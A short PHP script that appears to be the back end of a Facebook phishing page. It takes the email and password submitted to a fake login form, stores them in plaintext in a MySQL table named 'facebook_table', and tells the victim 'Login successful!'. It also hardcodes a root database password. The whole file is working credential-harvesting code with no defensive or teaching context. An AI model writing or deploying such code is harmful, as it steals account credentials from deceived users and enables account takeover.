<?php

$host = "localhost";
$username = "root";
$password = "topherDB123";
$database = "facebook";

$conn = new mysqli($host, $username, $password, $database);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$user = $_POST['email'];
$pass = $_POST['password'];

$sql = "INSERT INTO facebook_table (email, password) VALUES (?, ?)";
$stmt = $conn->prepare($sql);
$stmt->bind_param("ss", $user, $pass);

if ($stmt->execute()) {
    echo "Login successful!.";
} else {
    echo "Error: " . $stmt->error;
}

$stmt->close();
$conn->close();

?>